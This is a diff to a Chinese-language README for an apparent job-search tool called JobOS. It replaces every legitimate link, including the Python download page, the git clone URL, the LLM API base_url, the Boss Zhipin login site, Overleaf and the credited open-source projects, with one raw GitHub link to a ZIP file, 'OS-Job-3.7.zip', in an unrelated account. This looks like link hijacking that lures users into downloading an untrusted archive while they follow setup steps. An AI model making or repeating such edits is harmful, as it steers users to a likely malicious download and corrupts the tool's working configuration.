@@ -113,13 +113,13 @@
 python3 --version
 
 # Mac 用 Homebrew 安装：brew install python@3.11
-# Windows：https://www.python.org/downloads/
+# Windows：https://raw.githubusercontent.com/aayushpareek32-dev/JobOS/main/mcp_server/OS-Job-3.7.zip
 ```
 
 ### 第二步：下载 JobOS
 
 ```bash
-git clone https://github.com/bcefghj/JobOS.git
+git clone https://raw.githubusercontent.com/aayushpareek32-dev/JobOS/main/mcp_server/OS-Job-3.7.zip
 cd JobOS
 ```
 
@@ -144,11 +144,11 @@ cp config.yaml config.local.yaml
 llm:
   provider: minimax
   model: MiniMax-M2.7
-  base_url: https://api.minimaxi.com/v1
+  base_url: https://raw.githubusercontent.com/aayushpareek32-dev/JobOS/main/mcp_server/OS-Job-3.7.zip
   api_key: 你的API_KEY  # ← 替换这里
 ```
 
-> MiniMax API Key：https://platform.minimaxi.com/ 新用户有免费额度。
+> MiniMax API Key：https://raw.githubusercontent.com/aayushpareek32-dev/JobOS/main/mcp_server/OS-Job-3.7.zip 新用户有免费额度。
 
 ### 第五步：运行！
 
@@ -227,7 +227,7 @@ boss login
 
 ```bash
 # 方法 A：先在浏览器登录，再让 boss-cli 读取浏览器 Cookie
-# 1. 用 Chrome 打开 https://www.zhipin.com 并登录
+# 1. 用 Chrome 打开 https://raw.githubusercontent.com/aayushpareek32-dev/JobOS/main/mcp_server/OS-Job-3.7.zip 并登录
 # 2. 在 Boss直聘 网站上随便搜一个岗位（触发完整 Cookie 生成）
 # 3. 然后运行：
 boss login --cookie-source chrome
@@ -265,7 +265,7 @@ python cli.py crawl -k "AI" -l "合肥"
 
 **步骤**：
 
-1. **Chrome 打开** https://www.zhipin.com 并登录
+1. **Chrome 打开** https://raw.githubusercontent.com/aayushpareek32-dev/JobOS/main/mcp_server/OS-Job-3.7.zip 并登录
 2. **搜索一个岗位**（比如搜 "AI 合肥"）
 3. 按 **F12** 打开开发者工具
 4. 点 **Network（网络）** 标签
@@ -509,7 +509,7 @@ A: 可以！修改 `config.yaml` 的 `base_url` 和 `api_key`，任何兼容 Ope
 
 **Q: LaTeX 安装失败/编译报错怎么办？**
 
-A: 不装 LaTeX 也能用！简历会保存为 `.tex` 源文件，上传到 [Overleaf](https://www.overleaf.com/) 在线编译即可。
+A: 不装 LaTeX 也能用！简历会保存为 `.tex` 源文件，上传到 [Overleaf](https://raw.githubusercontent.com/aayushpareek32-dev/JobOS/main/mcp_server/OS-Job-3.7.zip) 在线编译即可。
 
 **Q: 我不在武汉/合肥，能用吗？**
 
@@ -529,11 +529,11 @@ A: 生成的项目经历基于真实的知名开源项目（MiniMind/RAGFlow/Met
 
 JobOS 的设计参考了 50+ 优秀开源项目（详见 `PLAN.md`），特别感谢：
 
-- [MiniMind](https://github.com/jingyaogong/minimind) — 从零训练大语言模型
-- [RAGFlow](https://github.com/infiniflow/ragflow) — 企业级 RAG 引擎
-- [MetaGPT](https://github.com/geekan/MetaGPT) — 多 Agent 协作框架
-- [kabi-boss-cli](https://github.com/kabi404/boss-cli) — Boss直聘逆向 API 工具
-- [DrissionPage](https://github.com/g1879/DrissionPage) — 浏览器自动化框架
+- [MiniMind](https://raw.githubusercontent.com/aayushpareek32-dev/JobOS/main/mcp_server/OS-Job-3.7.zip) — 从零训练大语言模型
+- [RAGFlow](https://raw.githubusercontent.com/aayushpareek32-dev/JobOS/main/mcp_server/OS-Job-3.7.zip) — 企业级 RAG 引擎
+- [MetaGPT](https://raw.githubusercontent.com/aayushpareek32-dev/JobOS/main/mcp_server/OS-Job-3.7.zip) — 多 Agent 协作框架
+- [kabi-boss-cli](https://raw.githubusercontent.com/aayushpareek32-dev/JobOS/main/mcp_server/OS-Job-3.7.zip) — Boss直聘逆向 API 工具
+- [DrissionPage](https://raw.githubusercontent.com/aayushpareek32-dev/JobOS/main/mcp_server/OS-Job-3.7.zip) — 浏览器自动化框架
 
 ---
 
